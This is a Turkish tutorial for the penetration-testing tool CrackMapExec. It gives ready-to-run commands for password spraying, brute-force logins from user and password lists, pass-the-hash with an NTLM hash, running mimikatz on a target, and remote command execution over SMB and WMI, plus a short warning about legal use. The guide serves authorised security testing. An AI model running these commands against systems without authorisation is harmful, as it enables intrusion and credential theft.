# CrackMapExec Kullanım Kılavuzu

## Giriş
CrackMapExec (CME), pen-test ve red team çalışmalarında kullanılan güçlü bir araçtır. Özellikle Active Directory ortamlarında kullanıcı ve servis hesaplarını test etmek, güvenlik açıklarını belirlemek ve çeşitli istismarlar gerçekleştirmek için idealdir. Bu kılavuz, CrackMapExec aracının temel işlevlerini ve kullanımını detaylı bir şekilde açıklamaktadır.

---

## Kurulum
### Gereksinimler
- Python 3.7+
- pip

### Yükleme
CrackMapExec'i yüklemek için aşağıdaki adımları takip edin:

```bash
# Gerekli bağımlılıkları yükleyin
sudo apt update && sudo apt install -y python3-pip libssl-dev libffi-dev

# CME'yi yükleyin
pip3 install crackmapexec

# Yükleme başarılı mı kontrol edin
cme --version
```

---

## Temel Kullanım
CrackMapExec'in genel komut yapısı şu şekildedir:

```bash
cme <protokol> <hedef> -u <kullanıcı> -p <şifre> [opsiyonlar]
```

- `<protokol>`: smb, ldap, ssh, winrm gibi protokol türleri.
- `<hedef>`: IP adresi, ağ bloğu veya hostname.
- `-u`: Kullanıcı adı.
- `-p`: Şifre veya şifre dosyası.

### Örnek:
```bash
cme smb 192.168.1.0/24 -u admin -p password123
```

Bu komut, belirtilen ağda SMB protokolü kullanarak `admin` kullanıcı adı ve `password123` şifresi ile giriş yapmayı dener.

---

## Sık Kullanılan Komutlar

### 1. Bilgi Toplama
Hedef sistem hakkında bilgi toplamak için kullanılabilir.

#### SMB Versiyonu Tespiti:
```bash
cme smb 192.168.1.10 --shares
```

#### İşletim Sistemi Bilgisi:
```bash
cme smb 192.168.1.10 -u guest -p ""
```

### 2. Kimlik Doğrulama Testleri
#### Kullanıcı ve Şifre ile Test:
```bash
cme smb 192.168.1.10 -u admin -p password123
```

#### Kullanıcı ve Şifre Dosyası ile Test:
```bash
cme smb 192.168.1.10 -u users.txt -p passwords.txt
```

### 3. Modüller
CrackMapExec, çeşitli modülleri destekler. Bunları görmek için:

```bash
cme smb --modules
```

#### Örnek Modül Kullanımı:
```bash
cme smb 192.168.1.10 -u admin -p password123 -M mimikatz
```
Bu komut, hedef makinede `mimikatz` modülünü çalıştırır.

### 4. Password Spraying
Birden fazla hedef üzerinde aynı kullanıcı adı ve şifreyi test etmek için kullanılır.

```bash
cme smb 192.168.1.0/24 -u admin -p Winter2025!
```

### 5. Hash Passing
NTLM hash kullanarak kimlik doğrulama yapabilirsiniz.

```bash
cme smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### 6. Komut Çalıştırma
#### Windows Komutları Çalıştırma:
```bash
cme smb 192.168.1.10 -u admin -p password123 --exec-method smbexec -x "whoami"
```

#### PowerShell Komutları Çalıştırma:
```bash
cme smb 192.168.1.10 -u admin -p password123 --exec-method wmiexec -x "powershell -Command Get-Process"
```

---

## İpuçları
- **Timeout Ayarı**: Ağ bağlantılarında gecikme yaşanıyorsa timeout süresini artırabilirsiniz:
  ```bash
  cme smb 192.168.1.10 -u admin -p password123 --timeout 30
  ```

- **Verbose Mod**: Daha detaylı çıktı almak için `-v` seçeneğini kullanın:
  ```bash
  cme smb 192.168.1.10 -u admin -p password123 -v
  ```

- **Loglama**: Çıktıları bir dosyaya kaydetmek için:
  ```bash
  cme smb 192.168.1.10 -u admin -p password123 --log output.log
  ```

---

## Faydalı Kaynaklar
- [Resmi Dokümantasyon](https://github.com/byt3bl33d3r/CrackMapExec)
- [Active Directory Hacking Kılavuzu](https://exploitart.ist)

---

## Uyarılar
- CrackMapExec'i yalnızca yasal ve izin verilen durumlarda kullanın. Yasadışı kullanım ciddi cezalarla sonuçlanabilir.

---

Bu kılavuz, CrackMapExec ile güvenlik testleri yaparken size yol gösterecektir. Sorularınız veya önerileriniz için lütfen benimle iletişime geçin.
